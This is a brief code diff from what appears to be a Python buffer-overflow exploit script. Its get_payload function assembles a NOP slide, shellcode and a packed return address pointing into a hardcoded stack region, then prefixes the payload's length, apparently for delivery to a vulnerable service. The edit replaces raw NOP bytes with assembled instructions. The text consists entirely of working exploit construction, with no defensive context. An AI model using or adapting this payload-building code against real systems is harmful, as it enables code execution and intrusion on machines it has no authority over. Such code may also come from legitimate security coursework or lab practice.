@@ -35,8 +35,8 @@ def get_payload():
     
     number_of_nops = total_size - len (shellcode) #Calculate the size of the nop slide
     ra = 0xbfffde0e + int(number_of_nops/2) #land in the middle of nopslide, for testing on debug used static vlaue of 0xbfffde0e + 450 = 0xbfffdfd0
-    nop_slide = '\x90' * (number_of_nops-1) + '\xf4'	#creating the nop slide
-    payload = nop_slide + shellcode + str(struct.pack('<L', ra))
+    nop_slide = 'nop\n' * (number_of_nops)	#creating the nop slide
+    payload = assemble.assemble_data(nop_slide) + shellcode + str(struct.pack('<L', ra))
     return str(struct.pack('>L', len(payload))) + payload
 
     # NOTE:
